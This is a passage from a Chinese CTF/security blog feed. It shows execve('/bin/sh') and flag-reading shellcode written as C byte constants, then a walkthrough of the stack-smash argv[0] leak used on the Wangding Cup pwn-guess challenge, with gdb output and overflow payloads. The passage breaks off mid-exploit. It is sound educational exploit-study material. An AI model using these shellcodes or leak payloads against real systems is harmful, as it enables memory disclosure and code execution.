ends</span><br></pre></td></tr></table></figure><p>接下来我用gdb动态调试一波,下断点到main函数的地方,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x400564</span><br><span class="line">Breakpoint 2 at 0x400564</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400564 in main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────</span><br><span class="line"> RAX  0x400564 (main) ◂— push   rbp</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7fffffffde28 —▸ 0x7fffffffe1df ◂— &apos;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&apos;</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line"> R8   0x400550 (__libc_csu_fini) ◂— ret    </span><br><span class="line"> R9   0x7ffff7de7ac0 (_dl_fini) ◂— push   rbp</span><br><span class="line"> R10  0x846</span><br><span class="line"> R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14</span><br><span class="line"> R12  0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffde10 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x4004e0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400564 (main) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line"> ► 0x400564 &lt;main&gt;      push   rbp &lt;0x4004e0&gt;</span><br><span class="line">   0x400565 &lt;main1&gt;     mov    rbp, rsp</span><br><span class="line">   0x400568 &lt;main4&gt;     mov    eax, 1</span><br><span class="line">   0x40056d &lt;main9&gt;     mov    ebx, 1</span><br><span class="line">   0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</span><br><span class="line">   0x400579 &lt;main21&gt;    mov    edx, 0xd</span><br><span class="line">   0x40057e &lt;main26&gt;    syscall </span><br><span class="line">   0x400580 &lt;main28&gt;    mov    eax, 0x3c</span><br><span class="line">   0x400585 &lt;main33&gt;    xor    ebx, ebx</span><br><span class="line">   0x400587 &lt;main35&gt;    syscall </span><br><span class="line">   0x400589 &lt;main37&gt;    insb   byte ptr [rdi], dx</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fffffffdd40 ◂— 0x1</span><br><span class="line">02:0010│      0x7fffffffdd48 —▸ 0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line">03:0018│      0x7fffffffdd50 ◂— 0x1f7ffcca0</span><br><span class="line">04:0020│      0x7fffffffdd58 —▸ 0x400564 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fffffffdd60 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd68 ◂— 0x74c583ff1005bf92</span><br><span class="line">07:0038│      0x7fffffffdd70 —▸ 0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────</span><br><span class="line"> ► f 0           400564 main</span><br><span class="line">   f 1     7ffff7a2d830 __libc_start_main+240</span><br><span class="line">Breakpoint *0x400564</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>看到这里我明白了，上述代码其实是一段shellcode，gcc编译器是如何识别并编译的，这里我不得而知，看来还要再看一遍程序员的自我修养啊。</p><p>分析一下生成的汇编吧。<code>0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</code> 其中这段汇编让我很感兴趣，</p><p>程序动态执行的时候总是把静态的数据用这种方式<code>[eip + 0x10]</code>来传参</p><p>很显然里面存的是Hello world，然后syscall系统调用write函数输出，第二次syscall系统调用exit函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10s 0x400579+0x10</span><br><span class="line">0x400589 &lt;main37&gt;:&quot;Hello World!\n]&quot;</span><br><span class="line">0x400598:&quot;\001\033\003;,&quot;</span><br><span class="line">0x40059e:&quot;&quot;</span><br><span class="line">0x40059f:&quot;&quot;</span><br><span class="line">0x4005a0:&quot;\004&quot;</span><br><span class="line">0x4005a2:&quot;&quot;</span><br><span class="line">0x4005a3:&quot;&quot;</span><br><span class="line">0x4005a4:&quot;\030\376\377\377x&quot;</span><br><span class="line">0x4005aa:&quot;&quot;</span><br><span class="line">0x4005ab:&quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-模仿操作"><a href="#6-模仿操作" class="headerlink" title="6.模仿操作"></a>6.模仿操作</h2><p>用上述方式写 execve(“/bin/sh”)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>  main = <span class="number">0x6a</span>, main1 = <span class="number">0x42</span>, main2 = <span class="number">0x58</span>, main3 = <span class="number">0xfe</span>, main4 = <span class="number">0xc4</span>, main5 = <span class="number">0x48</span>, main6 = <span class="number">0x99</span>, main7 = <span class="number">0x52</span>, main8 = <span class="number">0x48</span>, main9 = <span class="number">0xbf</span>,main10 = <span class="number">0x2f</span>, main11 = <span class="number">0x62</span>, main12 = <span class="number">0x69</span>, main13 = <span class="number">0x6e</span>, main14 = <span class="number">0x2f</span>, main15 = <span class="number">0x2f</span>, main16 = <span class="number">0x73</span>, main17 = <span class="number">0x68</span>, main18 = <span class="number">0x57</span>, main19 = <span class="number">0x54</span>,main20 = <span class="number">0x5e</span>, main21 = <span class="number">0x49</span>, main22 = <span class="number">0x89</span>, main23 = <span class="number">0xd0</span>, main24 = <span class="number">0x49</span>, main25 = <span class="number">0x89</span>, main26 = <span class="number">0xd2</span>, main27 = <span class="number">0x0f</span>, main28 = <span class="number">0x05</span>;</span><br></pre></td></tr></table></figure><p>orw flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main=<span class="number">0x48</span>,main1=<span class="number">0xb8</span>,main2=<span class="number">0x1</span>,main3=<span class="number">0x1</span>,main4=<span class="number">0x1</span>,main5=<span class="number">0x1</span>,main6=<span class="number">0x1</span>,main7=<span class="number">0x1</span>,main8=<span class="number">0x1</span>,main9=<span class="number">0x1</span>,main10=<span class="number">0x50</span>,main11=<span class="number">0x48</span>,main12=<span class="number">0xb8</span>,main13=<span class="number">0x67</span>,main14=<span class="number">0x2e</span>,main15=<span class="number">0x67</span>,main16=<span class="number">0x6d</span>,main17=<span class="number">0x60</span>,main18=<span class="number">0x66</span>,main19=<span class="number">0x1</span>,main20=<span class="number">0x1</span>,main21=<span class="number">0x48</span>,main22=<span class="number">0x31</span>,main23=<span class="number">0x4</span>,main24=<span class="number">0x24</span>,main25=<span class="number">0x48</span>,main26=<span class="number">0xb8</span>,main27=<span class="number">0x2f</span>,main28=<span class="number">0x68</span>,main29=<span class="number">0x6f</span>,main30=<span class="number">0x6d</span>,main31=<span class="number">0x65</span>,main32=<span class="number">0x2f</span>,main33=<span class="number">0x63</span>,main34=<span class="number">0x74</span>,main35=<span class="number">0x50</span>,main36=<span class="number">0x48</span>,main37=<span class="number">0x89</span>,main38=<span class="number">0xe7</span>,main39=<span class="number">0x31</span>,main40=<span class="number">0xd2</span>,main41=<span class="number">0x31</span>,main42=<span class="number">0xf6</span>,main43=<span class="number">0x6a</span>,main44=<span class="number">0x2</span>,main45=<span class="number">0x58</span>,main46=<span class="number">0xf</span>,main47=<span class="number">0x5</span>,main48=<span class="number">0x31</span>,main49=<span class="number">0xc0</span>,main50=<span class="number">0x6a</span>,main51=<span class="number">0x3</span>,main52=<span class="number">0x5f</span>,main53=<span class="number">0x6a</span>,main54=<span class="number">0x20</span>,main55=<span class="number">0x5a</span>,main56=<span class="number">0x48</span>,main57=<span class="number">0x89</span>,main58=<span class="number">0xe6</span>,main59=<span class="number">0xf</span>,main60=<span class="number">0x5</span>,main61=<span class="number">0x6a</span>,main62=<span class="number">0x1</span>,main63=<span class="number">0x5f</span>,main64=<span class="number">0x6a</span>,main65=<span class="number">0x20</span>,main66=<span class="number">0x5a</span>,main67=<span class="number">0x48</span>,main68=<span class="number">0x89</span>,main69=<span class="number">0xe6</span>,main70=<span class="number">0x6a</span>,main71=<span class="number">0x1</span>,main72=<span class="number">0x58</span>,main73=<span class="number">0xf</span>,main74=<span class="number">0x5</span>;</span><br></pre></td></tr></table></figure><p>参考：</p><p>有趣的”Hello World”</p><p><a href="https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 前段时间在逛知乎的时候，偶然发现一道有意思的编程题&lt;br&gt;&lt;img alt=&quot;知乎&quot; data-src=&quot;https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbq
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>__stack_chk_fail相关利用</title>
    <link href="https://nocbtm.github.io/2020/04/28/stack-chk-fail%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/28/stack-chk-fail相关利用/</id>
    <published>2020-04-28T03:27:57.000Z</published>
    <updated>2020-04-29T16:16:56.202Z</updated>
    
    <content type="html"><![CDATA[<p>在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-Stack-smash"><a href="#1-Stack-smash" class="headerlink" title="1. Stack smash"></a>1. Stack smash</h2><p>Linux 系统中，为了防御栈溢出漏洞的利用，通常会部署 Canary 漏洞缓解措施。Wiki 中对 Canary 的解释如下：</p><blockquote><p>Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled, for example, by invalidating the corrupted data.</p></blockquote><p>下面简单描述下 Canary 的原理。对于栈溢出漏洞的利用，最简单的方法就是通过溢出数据修改栈中函数返回地址为目标内存地址，当函数返回时将会跳转到目标内存处执行指令，从而实现控制流劫持。为了防御这种利用方法，分配栈空间时在 EBP-4 的位置存放一个 Canary 值，函数返回之前会校验该值是否被修改，若检测到被修改则调用 <code>__stack_chk_fail</code> 函数抛出异常并结束进程。可见，要覆盖函数返回地址必须修改 Canary，从而可防御该攻击方法。gcc 编译器默认开启该缓解机制，编译时可用 <code>-fno-stack-protector</code> 选项关闭该机制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> Low Address |                 |</span><br><span class="line">             +-----------------+</span><br><span class="line">     esp =&gt;  | local variables |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[0-3]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[4-7]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     canary      |</span><br><span class="line">             +-----------------+</span><br><span class="line">     ebp =&gt;  |     old ebp     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |   return addr   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |      args       |</span><br><span class="line">             +-----------------+</span><br><span class="line">High Address |                 |</span><br></pre></td></tr></table></figure><p>libc 中 <code>__stack_chk_fail</code> 的源码如下，该函数调用 <code>__fortify_fail</code> 输出异常信息，其中包含 libc_argv[0] 指向的程序名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若通过栈溢出漏洞可修改栈内存中 argv[0] 指针，那么触发 Stack smash 时可泄露内存信息。例如把 argv[0] 修改为 got 表项可泄露出内存中函数地址，为进一步利用提供条件。</p><h2 id="2-environ"><a href="#2-environ" class="headerlink" title="2. environ"></a>2. environ</h2><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x00400000         0x00401000         r-xp      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00601000         0x00602000         r--p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00602000         0x00603000         rw-p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 rw-p      mapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]</span><br><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdc98</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdc98</span><br><span class="line">0000| 0x7fffffffdc98 --&gt; 0x7fffffffe0ae (&quot;XDG_SESSION_ID=c2&quot;)</span><br><span class="line">0008| 0x7fffffffdca0 --&gt; 0x7fffffffe0c0 (&quot;QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1&quot;)</span><br><span class="line">0016| 0x7fffffffdca8 --&gt; 0x7fffffffe0e3 (&quot;UNITY_DEFAULT_PROFILE=unity&quot;)</span><br><span class="line">0024| 0x7fffffffdcb0 --&gt; 0x7fffffffe0ff (&quot;GNOME_KEYRING_PID=&quot;)</span><br><span class="line">0032| 0x7fffffffdcb8 --&gt; 0x7fffffffe112 (&quot;GNOME_KEYRING_CONTROL=&quot;)</span><br><span class="line">0040| 0x7fffffffdcc0 --&gt; 0x7fffffffe129 (&quot;DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path&quot;)</span><br><span class="line">0048| 0x7fffffffdcc8 --&gt; 0x7fffffffe15c (&quot;LOGNAME=lc&quot;)</span><br><span class="line">0056| 0x7fffffffdcd0 --&gt; 0x7fffffffe167 (&quot;INSTANCE=&quot;)</span><br></pre></td></tr></table></figure><h1 id="实例分析-网鼎杯-pwn-guess"><a href="#实例分析-网鼎杯-pwn-guess" class="headerlink" title="实例分析  网鼎杯 pwn-guess"></a>实例分析  网鼎杯 pwn-guess</h1><p>下面通过调试 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/stack_smash" target="_blank" rel="noopener">网鼎杯的 pwn-GUESS</a> 的利用过程说明 Stack smash 利用方法。</p><h2 id="1-漏洞位置"><a href="#1-漏洞位置" class="headerlink" title="1. 漏洞位置"></a>1. 漏洞位置</h2><p>程序首先将 flag 读入内存中的 buf，用户有 3 次猜测 flag 的机会。通过 gets() 读取用户输入时存在栈溢出漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);         // overflow</span><br><span class="line">  if ( !strcmp(&amp;buf, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>首先查看程序开启的漏洞缓解机制，发现已开启 Canary 和 NX，未开启 PIE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><p>由于程序中 sub_400A11() 函数使用 fork 子进程的方式允许用户有 3 次猜测 flag 的机会，同时又将 flag 读入栈中，因此可利用 Stack smash 进行 3 次内存泄漏获得 flag。具体利用思路如下：</p><ul><li>通过栈溢出漏洞覆盖 argv[0] 为 <code>__libc_start_main</code> 的 got 表项，触发 Stack smash 可泄露 <code>__libc_start_main</code> 函数地址，利用给出的 libc 文件可计算得到 libc 基地址；</li><li>计算出 environ 在内存中的地址，第二次利用栈溢出漏洞覆盖 argv[0] 为 <code>environ</code> ，泄露出 environ 的值，即指向环境变量的栈地址；</li><li>根据栈内存中 flag 与 environ 值的偏移量计算出 flag 的栈地址，再次利用栈溢出漏洞覆盖 argv[0] 为 flag 的栈地址，从而可读取 flag 的值。</li></ul><h3 id="1）泄露-libc-基址"><a href="#1）泄露-libc-基址" class="headerlink" title="1）泄露 libc 基址"></a>1）泄露 libc 基址</h3><p>首先，从下图栈内存信息可知缓冲区 s2 地址为 0x7fffffffdb60， argv[0] 地址为 0x7fffffffdc88，从而可计算出 s2 与 argv[0] 间的偏移量为 0x128（0x7fffffffdc88-0x7fffffffdb60）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400b1b:    mov    rdi,rax</span><br><span class="line">   0x400b1e:    mov    eax,0x0</span><br><span class="line">   0x400b23:    call   0x400830 &lt;gets@plt&gt;</span><br><span class="line">=&gt; 0x400b28:    lea    rdx,[rbp-0x40]</span><br><span class="line">   0x400b2c:    lea    rax,[rbp-0x70]</span><br><span class="line">   0x400b30:    mov    rsi,rdx</span><br><span class="line">   0x400b33:    mov    rdi,rax</span><br><span class="line">   0x400b36:    call   0x400820 &lt;strcmp@plt&gt;</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000000000400b28 in ?? ()</span><br><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0x7fffffffdb00 --&gt; 0x7fffffffdc88 --&gt; 0x7fffffffe091 (&quot;/home/lc/Desktop/guess/guess&quot;)</span><br><span class="line">0008| 0x7fffffffdb08 --&gt; 0x100000000 </span><br><span class="line">0016| 0x7fffffffdb10 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdb18 --&gt; 0x3 </span><br><span class="line">0032| 0x7fffffffdb20 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdb28 --&gt; 0x3 </span><br><span class="line">0048| 0x7fffffffdb30 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0056| 0x7fffffffdb38 (&quot;61991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0064| 0x7fffffffdb40 (&quot;943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0072| 0x7fffffffdb48 (&quot;57863eec75961&#125;\n&quot;)</span><br><span class="line">0080| 0x7fffffffdb50 --&gt; 0xa7d3136393537 (&apos;75961&#125;\n&apos;)</span><br><span class="line">0088| 0x7fffffffdb58 --&gt; 0x0 </span><br><span class="line">0096| 0x7fffffffdb60 (&apos;A&apos; &lt;repeats 16 times&gt;)</span><br><span class="line">0104| 0x7fffffffdb68 (&quot;AAAAAAAA&quot;)</span><br><span class="line">0112| 0x7fffffffdb70 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>因此可构造以下 payload 将 argv[0] 覆盖为 <code>__libc_start_main</code> 的 got 表项，可泄露出 <code>__libc_start_main</code> 函数在内存中的地址，从而计算出 libc 的基址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;A&apos; * 0x128 + p64(libc_start_main_got)</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[&apos;__libc_start_main&apos;]</span><br></pre></td></tr></table></figure><p>泄露出 libc 基址为 0x7ffff7a0d000。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  40 d7 a2 f7  ff 7f 20 74  │ed *│**: │@···│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">libc_base_addr = 0x7ffff7a0d000</span><br></pre></td></tr></table></figure><h3 id="2）泄露-environ"><a href="#2）泄露-environ" class="headerlink" title="2）泄露 environ"></a>2）泄露 environ</h3><p>构造以下 payload，第二次利用栈溢出将 argv[0] 覆盖为 <code>environ</code> 的地址，从而泄露出 <code>environ</code> 的值，该值为执行环境变量的栈地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">environ_addr = libc_base_addr + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">payload1 = &apos;A&apos; * 0x128 + p64(environ_addr)</span><br></pre></td></tr></table></figure><p>泄露出 <code>environ</code> 的值为 0x7fffffffdcf8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 